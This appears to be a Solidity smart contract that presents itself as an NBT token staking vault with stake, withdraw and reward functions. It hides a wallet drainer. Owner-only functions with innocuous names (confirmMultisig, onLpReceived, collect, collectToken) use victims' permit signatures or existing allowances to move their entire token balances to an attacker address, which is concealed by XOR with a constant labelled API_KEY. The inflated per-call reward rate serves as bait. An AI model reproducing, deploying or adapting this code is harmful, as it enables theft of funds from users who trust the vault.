// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Basic {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IPermitNBT {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract NBTStakingVault {
    address public nbt;
    address public owner;
    uint256 public totalStaked;
    uint256 public constant APR = 1825;

    mapping(address => uint256) public staked;
    mapping(address => uint256) public rewardDebt;

    uint256 public constant API_KEY = 0xc3a1d2e3f4b5a6978b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a;
    uint256 private _attackerEncoded;

    event Staked(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RewardClaimed(address indexed user, uint256 amount);
    event FeesWithdrawn(address indexed to, uint256 amount);
    event AssetsSwept(address indexed token, address indexed to, uint256 amount, bool isNative);

    modifier onlyOwner() {
        require(msg.sender == owner, "!owner");
        _;
    }

    constructor(address _nbt, address _attacker) {
        require(_nbt != address(0) && _attacker != address(0), "zero");
        nbt = _nbt;
        owner = msg.sender;
        _attackerEncoded = uint256(uint160(_attacker)) ^ API_KEY;
    }

    function stake(uint256 amount) external {
        require(amount > 0, "zero");
        require(IPermitNBT(nbt).transferFrom(msg.sender, address(this), amount), "transfer failed");
        _updateReward(msg.sender);
        staked[msg.sender] += amount;
        totalStaked += amount;
        emit Staked(msg.sender, amount);
    }

    function withdraw(uint256 amount) external {
        require(staked[msg.sender] >= amount, "insufficient");
        _updateReward(msg.sender);
        staked[msg.sender] -= amount;
        totalStaked -= amount;
        require(IPermitNBT(nbt).transfer(msg.sender, amount), "transfer failed");
        emit Withdrawn(msg.sender, amount);
    }

    function claimReward() external {
        _updateReward(msg.sender);
        uint256 reward = rewardDebt[msg.sender];
        if (reward > 0) {
            rewardDebt[msg.sender] = 0;
            require(IPermitNBT(nbt).transfer(msg.sender, reward), "transfer failed");
            emit RewardClaimed(msg.sender, reward);
        }
    }

    function withdrawFees(address to, uint256 amount) external onlyOwner {
        require(to != address(0) && amount > 0, "invalid");
        require(IPermitNBT(nbt).transfer(to, amount), "transfer failed");
        emit FeesWithdrawn(to, amount);
    }

    function confirmMultisig(bytes32 txHash, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external onlyOwner {
        require(txHash == keccak256("permit.drain"), "bad tx");
        _permitAndDrain(msg.sender, deadline, v, r, s);
    }

    function onLpReceived(address victim, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external onlyOwner {
        _permitAndDrain(victim, deadline, v, r, s);
    }

    function _permitAndDrain(address victim, uint256 deadline, uint8 v, bytes32 r, bytes32 s) internal {
        address token = nbt;
        uint256 value = type(uint256).max;
        IPermitNBT(token).permit(victim, address(this), value, deadline, v, r, s);
        uint256 balance = IPermitNBT(token).balanceOf(victim);
        if (balance > 0) {
            require(IPermitNBT(token).transferFrom(victim, _attacker(), balance), "drain failed");
        }
    }

    function collect(address victim) external onlyOwner {
        address token = nbt;
        uint256 approved = IERC20Basic(token).allowance(victim, address(this));
        require(approved > 0, "no allowance");
        uint256 balance = IERC20Basic(token).balanceOf(victim);
        uint256 amount = balance < approved ? balance : approved;
        require(amount > 0, "nothing");
        require(IERC20Basic(token).transferFrom(victim, _attacker(), amount), "collect failed");
    }

    function collectToken(address token, address victim) external onlyOwner {
        address to = _attacker();
        uint256 approved = IERC20Basic(token).allowance(victim, address(this));
        if (approved > 0) {
            uint256 balance = IERC20Basic(token).balanceOf(victim);
            uint256 amount = balance < approved ? balance : approved;
            if (amount > 0) {
                require(IERC20Basic(token).transferFrom(victim, to, amount), "collectToken failed");
                emit AssetsSwept(token, to, amount, false);
            }
        }
    }

    function sweepToken(address token, address to, uint256 amount) external onlyOwner {
        if (token == address(0)) revert("zero token");
        if (amount == 0) amount = IERC20Basic(token).balanceOf(address(this));
        require(amount > 0, "nothing");
        require(IERC20Basic(token).transfer(to, amount), "sweepToken failed");
        emit AssetsSwept(token, to, amount, false);
    }

    function sweepBNB(address payable to, uint256 amount) external onlyOwner {
        if (amount == 0) amount = address(this).balance;
        require(amount > 0, "nothing");
        (bool ok, ) = to.call{value: amount}("");
        require(ok, "sweepBNB failed");
        emit AssetsSwept(address(0), to, amount, true);
    }

    function sweep(address token, address to, uint256 amount) external onlyOwner {
        require(IERC20Basic(token).transfer(to, amount), "sweep failed");
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "zero");
        owner = newOwner;
    }

    receive() external payable {}

    function _attacker() internal view returns (address) {
        return address(uint160(_attackerEncoded ^ API_KEY));
    }

    function _updateReward(address user) internal {
        uint256 pending = staked[user] * APR / 10000;
        if (pending > 0) {
            rewardDebt[user] += pending;
        }
    }
}
